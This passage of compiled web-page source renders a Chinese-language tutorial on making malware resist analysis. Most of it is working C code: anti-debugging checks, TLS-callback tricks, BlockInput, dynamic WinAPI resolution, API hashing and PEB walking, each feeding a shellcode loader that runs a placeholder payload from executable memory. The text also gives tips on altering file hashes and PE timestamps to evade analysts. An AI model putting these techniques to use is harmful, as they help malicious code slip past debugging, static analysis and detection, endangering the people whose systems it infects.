NULL);\n\tSetUnhandledExceptionFilter(previousUnhandledExceptionFilter);\n\tif (isDebugged) return;\n\n\twprintf_s(L"Now hacking...\\n");\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br")])]),e("h3",{attrs:{id:"自调试"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#自调试"}},[s._v("#")]),s._v(" 自调试")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("if (!DebugActiveProcess(pid))\n{\n\tHANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);\n\tTerminateProcess(hProcess, 0);\n}\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("h3",{attrs:{id:"执行时间"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#执行时间"}},[s._v("#")]),s._v(" 执行时间")]),s._v(" "),e("p",[s._v("我们可以检查某个指令块之前和之后的系统时间，并假设测得的经过时间应小于某个值。如果正在分析应用程序，则可能在该指令块中设置了断点。如果这样，执行时间将超过假定的时间段。")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('int t1 = GetTickCount64();\nHack(); // should take less than 5 seconds\nint t2 = GetTickCount64();\nif (((t2 - t1) / 1000) > 5) return; \n\nwprintf_s(L"Now hacking more...\\n");\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("h2",{attrs:{id:"为逆向工程师增加难度"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#为逆向工程师增加难度"}},[s._v("#")]),s._v(" 为逆向工程师增加难度")]),s._v(" "),e("h3",{attrs:{id:"执行路径回调"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#执行路径回调"}},[s._v("#")]),s._v(" 执行路径回调")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('VOID CALLBACK MyCallback(DWORD errorCode, DWORD bytesTransferred, POVERLAPPED pOverlapped)\n{\n\tMessageBoxW(NULL, L"Catch me if you can", L"xD", 0);\n}\n\nvoid main()\n{\n\tHANDLE hFile = CreateFileW(L"C:\\\\Windows\\\\win.ini", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);\n\tPVOID fileBuffer = VirtualAlloc(0, 64, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n\tOVERLAPPED overlapped = {0};\n\tReadFileEx(hFile, fileBuffer, 32, &overlapped, MyCallback);\n\n\tWaitForSingleObjectEx(hFile, INFINITE, true); // wait for the asynchronous operation to finish\n\twprintf_s(L"Already pwned...\\n");\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br")])]),e("h3",{attrs:{id:"tls（线程本地存储）回调"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#tls（线程本地存储）回调"}},[s._v("#")]),s._v(" TLS（线程本地存储）回调")]),s._v(" "),e("blockquote",[e("p",[s._v("TLS（线程本地存储）回调是一种Windows机制，允许在进程以及线程启动和终止上执行任意代码。它可以用来在main功能（或其他入口点）之前运行一些反调试代码。但是，大多数调试器会自动在断点之前main（“系统断点”- ntdll.LdrpDoDebuggerBreak）甚至在回调的开头放置断点。无论如何，回调实现需要某些链接器指令：")])]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('void NTAPI TlsCallback(PVOID DllHandle, DWORD dwReason, PVOID)\n{\n\tif (dwReason == DLL_PROCESS_ATTACH)\n\t{\n\t\tif (CheckIfDebugged()) exit(0);\n\t}\n}\n\n#pragma comment (linker, "/INCLUDE:_tls_used")\n#pragma comment (linker, "/INCLUDE:tls_callback_function")\n\n#pragma const_seg(".CRT$XLA")\nEXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_function = TlsCallback;\n#pragma const_seg()\n\nvoid main()\n{\n\twprintf_s(L"Now hacking...\\n");\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br")])]),e("h3",{attrs:{id:"阻止用户输入-需要admin"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#阻止用户输入-需要admin"}},[s._v("#")]),s._v(" 阻止用户输入-需要admin")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("BlockInput(true);\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("h2",{attrs:{id:"静态分析和混淆"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#静态分析和混淆"}},[s._v("#")]),s._v(" 静态分析和混淆")]),s._v(" "),e("h3",{attrs:{id:"pe"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#pe"}},[s._v("#")]),s._v(" PE")]),s._v(" "),e("p",[s._v("PE头包含了很多信息")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("headers, sections headers and content (code, resources etc.),\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("分析人员仅通过检查可执行文件（无需运行它）就可以提取大量有用的信息。这包括代码，导入的函数，硬编码的字符串和其他数据。")]),s._v(" "),e("h3",{attrs:{id:"更改hash"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#更改hash"}},[s._v("#")]),s._v(" 更改hash")]),s._v(" "),e("ul",[e("li",[s._v("改图标")]),s._v(" "),e("li",[s._v("加入版本信息")])]),s._v(" "),e("h3",{attrs:{id:"通过动态winapi函数解析来隐藏导入"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#通过动态winapi函数解析来隐藏导入"}},[s._v("#")]),s._v(" 通过动态WinAPI函数解析来隐藏导入")]),s._v(" "),e("p",[s._v("导入地址表（IAT）存储有关应用程序使用的库和函数的信息。操作系统会在可执行文件启动时动态加载它们。非常方便（这正是Windows的工作方式），但是表内容可以提供许多有关程序功能的信息。例如存储器操作和线程操作功能（VirtualAlloc，VirtualProcect，CreateRemoteThread）可以指示该应用正在执行某种代码注入的。WSASocket通常由绑定外壳和反向外壳以及SetWindowsHookEx键盘记录程序使用。")]),s._v(" "),e("p",[s._v("为了隐藏这些信息（从静态分析中），我们可以动态地解析某些API函数。我们甚至可以使用syscalls（请参阅userland钩子规避）。现在，让我们仅使用GetModuleHandle获取要kernel32.dll加载到内存中的句柄，然后使用以下命令查找必要的功能GetProcAddress：")]),s._v(" "),e("p",[s._v("https://github.com/lucasg/Dependencies可以查看PE信息")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);\ntypedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);\ntypedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);\n\nvoid main()\n{\n\tHMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");\n\tPVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");\n\tPCreateThread funcCreateThread = (PCreateThread)GetProcAddress(hKernel32, "CreateThread");\n\tPWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");\n\n\tunsigned char shellcode[] = "\\\\xfc\\\\x48\\\\x83 (...) ";\n\tPVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tmemcpy(shellcode_exec, shellcode, sizeof shellcode);\n\tDWORD threadID;\n\tHANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);\n\tfuncWaitForSingleObject(hThread, INFINITE);\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br")])]),e("h3",{attrs:{id:"api-hashing"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#api-hashing"}},[s._v("#")]),s._v(" API Hashing")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);\ntypedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);\ntypedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);\n\nunsigned int hash(const char *str)\n{\n\tunsigned int hash = 7759;\n\tint c;\n\n\twhile (c = *str++)\n\t\thash = ((hash << 5) + hash) + c;\n\n\treturn hash;\n}\n\nvoid main()\n{\n\tHMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");\n\tPVirtualAlloc funcVirtualAlloc;\n\tPCreateThread funcCreateThread;\n\tPWaitForSingleObject funcWaitForSingleObject;\n\n\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;\n\tPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader->e_lfanew);\n\tPIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader);\n\tPIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\tPULONG pAddressOfFunctions = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfFunctions);\n\tPULONG pAddressOfNames = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfNames);\n\tPUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)hKernel32 + pExportDirectory->AddressOfNameOrdinals);\n\n\tfor (int i = 0; i < pExportDirectory->NumberOfNames; ++i)\n\t{\n\t\tPCSTR pFunctionName = (PSTR)((PBYTE)hKernel32 + pAddressOfNames[i]);\n\t\tif (hash(pFunctionName) == 0x80fa57e1)\n\t\t{\n\t\t\tfuncVirtualAlloc = (PVirtualAlloc)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);\n\t\t}\n\t\tif (hash(pFunctionName) == 0xc7d73c9b)\n\t\t{\n\t\t\tfuncCreateThread = (PCreateThread)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);\n\t\t}\n\t\tif (hash(pFunctionName) == 0x50c272c4)\n\t\t{\n\t\t\tfuncWaitForSingleObject = (PWaitForSingleObject)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);\n\t\t}\n\t}\n\n\tunsigned char shellcode[] = "\\\\xfc\\\\x48\\\\x83";\n\n\tPVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tmemcpy(shellcode_exec, shellcode, sizeof shellcode);\n\tDWORD threadID;\n\tHANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);\n\tfuncWaitForSingleObject(hThread, INFINITE);\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br"),e("span",{staticClass:"line-number"},[s._v("51")]),e("br"),e("span",{staticClass:"line-number"},[s._v("52")]),e("br"),e("span",{staticClass:"line-number"},[s._v("53")]),e("br"),e("span",{staticClass:"line-number"},[s._v("54")]),e("br"),e("span",{staticClass:"line-number"},[s._v("55")]),e("br")])]),e("h3",{attrs:{id:"shellcode-style"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#shellcode-style"}},[s._v("#")]),s._v(" shellcode style")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('typedef HMODULE(WINAPI *PGetModuleHandleA)(PCSTR);\ntypedef FARPROC(WINAPI *PGetProcAddress)(HMODULE, PCSTR);\n\ntypedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);\ntypedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);\ntypedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);\n\nvoid main()\n{\n\tPPEB pPEB = (PPEB)__readgsqword(0x60);\n\tPPEB_LDR_DATA pLoaderData = pPEB->Ldr;\n\tPLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;\n\tPLIST_ENTRY listCurrent = listHead->Flink;\n\tPVOID kernel32Address;\n\tdo\n\t{\n\t\tPLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n\t\tDWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);\n\t\tPCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);\n\t\tWideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);\n\t\tCharUpperA(dllName);\n\t\tif (strstr(dllName, "KERNEL32.DLL"))\n\t\t{\n\t\t\tkernel32Address = dllEntry->DllBase;\n\t\t\tHeapFree(GetProcessHeap(), 0, dllName);\n\t\t\tbreak;\n\t\t}\n\t\tHeapFree(GetProcessHeap(), 0, dllName);\n\t\tlistCurrent = listCurrent->Flink;\n\t} while (listCurrent != listHead);\n\n\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;\n\tPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader->e_lfanew);\n\tPIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader);\n\tPIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\tPULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfFunctions);\n\tPULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfNames);\n\tPUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory->AddressOfNameOrdinals);\n\n\tPGetModuleHandleA pGetModuleHandleA = NULL;\n\tPGetProcAddress pGetProcAddress = NULL;\n\n\tfor (int i = 0; i < pExportDirectory->NumberOfNames; ++i)\n\t{\n\t\tPCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);\n\t\tif (!strcmp(pFunctionName, "GetModuleHandleA"))\n\t\t{\n\t\t\tpGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);\n\t\t}\n\t\tif (!strcmp(pFunctionName, "GetProcAddress"))\n\t\t{\n\t\t\tpGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);\n\t\t}\n\t}\n\n\tHMODULE hKernel32 = pGetModuleHandleA("kernel32.dll");\n\tPVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)pGetProcAddress(hKernel32, "VirtualAlloc");\n\tPCreateThread funcCreateThread = (PCreateThread)pGetProcAddress(hKernel32, "CreateThread");\n\tPWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)pGetProcAddress(hKernel32, "WaitForSingleObject");\n\n\tunsigned char shellcode[] = "\\\\xfc\\\\x48\\\\x83 (...) ";\n\tPVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tmemcpy(shellcode_exec, shellcode, sizeof shellcode);\n\tDWORD threadID;\n\tHANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);\n\tfuncWaitForSingleObject(hThread, INFINITE);\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br"),e("span",{staticClass:"line-number"},[s._v("51")]),e("br"),e("span",{staticClass:"line-number"},[s._v("52")]),e("br"),e("span",{staticClass:"line-number"},[s._v("53")]),e("br"),e("span",{staticClass:"line-number"},[s._v("54")]),e("br"),e("span",{staticClass:"line-number"},[s._v("55")]),e("br"),e("span",{staticClass:"line-number"},[s._v("56")]),e("br"),e("span",{staticClass:"line-number"},[s._v("57")]),e("br"),e("span",{staticClass:"line-number"},[s._v("58")]),e("br"),e("span",{staticClass:"line-number"},[s._v("59")]),e("br"),e("span",{staticClass:"line-number"},[s._v("60")]),e("br"),e("span",{staticClass:"line-number"},[s._v("61")]),e("br"),e("span",{staticClass:"line-number"},[s._v("62")]),e("br"),e("span",{staticClass:"line-number"},[s._v("63")]),e("br"),e("span",{staticClass:"line-number"},[s._v("64")]),e("br"),e("span",{staticClass:"line-number"},[s._v("65")]),e("br"),e("span",{staticClass:"line-number"},[s._v("66")]),e("br"),e("span",{staticClass:"line-number"},[s._v("67")]),e("br")])]),e("h3",{attrs:{id:"pe-analysis"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#pe-analysis"}},[s._v("#")]),s._v(" PE analysis")]),s._v(" "),e("p",[s._v("在静态检查恶意样本时，恶意软件分析师会查看PE文件的结构和内容。此数据可能会揭示有关该应用程序的某些详细信息，并有助于将其分类为恶意软件。我们讨论了导入，现在让我们集中讨论其他PE部分，嵌入式资源和时间戳。")]),s._v(" "),e("p",[s._v("pe结构看这里"),e("a",{attrs:{href:"https://thunderjie.github.io/2019/03/27/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/",target:"_blank",rel:"noopener noreferrer"}},[s._v("pe结构详解"),e("OutboundLink")],1)]),s._v(" "),e("h4",{attrs:{id:"时间"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#时间"}},[s._v("#")]),s._v(" 时间")]),s._v(" "),e("p",[s._v("PE标头包含TimeDateStamp4字节字段，这是Unix编译时间。可以轻松更改（例如使用十六进制编辑器）以隐藏实际的编译日期。")]),s._v(" 